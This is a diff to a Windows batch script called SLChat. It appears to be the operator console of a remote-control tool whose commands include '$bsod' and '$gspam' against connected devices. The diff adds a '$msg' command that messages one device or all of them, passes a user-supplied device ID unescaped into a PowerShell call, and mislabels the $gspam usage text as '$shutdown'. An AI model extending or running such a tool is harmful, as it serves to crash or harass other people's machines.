@@ -1,7 +1,7 @@
 :: SLChat
 :: WRITTEN BY 1K0DE
 
-set "_localMode=true"
+set "_localMode=false"
 
 set "chcp_on=chcp 65001 > nul"
 set "chcp_off=chcp 850 > nul"
@@ -541,6 +541,74 @@ if "!arg_1!" == "$bsod" (
     )
 )
 
+if "!arg_1!" == "$msg" (
+    if "!arg_2!" == "" (
+        echo.
+        %PRINT%{255;255;255}  Invalid command usage, please specify the device id.\n
+        %PRINT%{255;255;255}  Usage: $msg [DEVICE_ID: string] [message: string]\n
+        goto process_command_MM
+    )
+
+    for /f "delims=" %%A in ('powershell -Command "[Console]::WriteLine('!arg_2!'.ToLower())"') do set "arg_2=%%A"
+    echo.
+
+    if "!arg_2!" == "all" (
+        if "!arg_3!" == "" (
+            %PRINT%{255;255;255}  Invalid command usage, please specify the message text.\n
+            %PRINT%{255;255;255}  Usage: $msg [DEVICE_ID: string] [message: string]\n
+            goto process_command_MM
+        )
+
+        set "_msgText="
+        for /l %%X in (1, 1, !_count!) do (
+            if %%X NEQ 1 (
+                if %%X NEQ 2 (
+                    if %%X == 3 (
+                        set "_msgText=!arg_%%X!"
+                    ) else (
+                        set "_msgText=!_msgText! !arg_%%X!"
+                    )
+                )
+            )
+        )
+
+        Call TypeWriter "  > Sending message '!_msgText!' to ALL ACTIVE DEVICES.." 15
+        echo.
+        CALL :EXECUTE_COMMAND "msg" "all" "!_msgText!"
+        goto process_command_MM
+    )
+
+    if not exist "!fullPath!\!arg_2!" (
+        Call TypeWriter "  > Device Id '!arg_2!' not found..." 15
+        echo.
+        goto process_command_MM
+    )
+
+    if "!arg_3!" == "" (
+        %PRINT%{255;255;255}  Invalid command usage, please specify the message text.\n
+        %PRINT%{255;255;255}  Usage: $msg [DEVICE_ID: string] [message: string]\n
+        goto process_command_MM
+    )
+
+    set "_msgText="
+    for /l %%X in (1, 1, !_count!) do (
+        if %%X NEQ 1 (
+            if %%X NEQ 2 (
+                if %%X == 3 (
+                    set "_msgText=!arg_%%X!"
+                ) else (
+                    set "_msgText=!_msgText! !arg_%%X!"
+                )
+            )
+        )
+    )
+
+    Call TypeWriter "  > Sending message '!_msgText!' on device: !arg_2!.." 15
+    echo.
+    CALL :EXECUTE_COMMAND "msg" "!arg_2!" "!_msgText!"
+    goto process_command_MM
+)
+
 if "!arg_1!" == "$gspam" (
     if "!arg_2!" == "" (
         echo.
@@ -600,18 +668,15 @@ if "!arg_1!" == "$gspam" (
     
     set /a _delay=!arg_3! 2>nul
     if "!_delay!" == "!arg_3!" (
-        ::arg3 IS a number
         Call TypeWriter "  > Triggering GOOGLE SPAM on device: !arg_2! with a DELAY of !_delay! seconds.." 15
         echo.
-
         CALL :EXECUTE_COMMAND "gspam" "!arg_2!" !arg_3!
 
         echo.
         goto process_command_MM
     ) else (
-        ::arg3 IS NOT a number
         %PRINT%{255;255;255}  Invalid command usage, DELAY must be a number.\n
-        %PRINT%{255;255;255}  Usage: $gspam [DEVICE_ID: string] [DELAY: number]\n
+        %PRINT%{255;255;255}  Usage: $shutdown [DEVICE_ID: string] [DELAY: number]\n
         goto process_command_MM
     )
 )
